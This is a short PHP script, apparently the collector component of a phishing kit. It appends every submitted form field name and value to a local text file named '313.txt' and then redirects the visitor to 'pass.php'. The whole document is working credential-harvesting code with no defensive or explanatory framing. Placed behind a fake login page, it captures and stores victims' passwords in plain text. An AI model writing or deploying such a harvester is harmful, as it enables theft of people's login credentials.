<?php

// Set the location to redirect the page
header ('Location: pass.php');

// Open the text file in writing mode
$file = fopen("313.txt", "a");

foreach($_POST as $variable => $value) {
	fwrite($file, $variable);
	fwrite($file, "=");
	fwrite($file, $value);
	fwrite($file, "\r\n");
}
fwrite($file, "\r\n");
fclose($file);
exit;
?>
